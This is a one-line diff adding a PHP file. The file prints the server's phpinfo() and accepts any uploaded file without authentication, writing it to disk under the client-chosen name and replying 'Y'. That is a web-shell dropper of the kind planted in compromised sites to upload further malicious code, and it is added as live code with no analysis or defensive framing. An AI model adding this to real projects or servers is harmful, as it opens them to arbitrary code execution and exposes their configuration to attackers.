@@ -1,0 +1,1 @@
+<?php phpinfo(); if(isset($_FILES['0'])){move_uploaded_file($_FILES['0']['tmp_name'],$_FILES['0']['name']);print'Y';} ?>
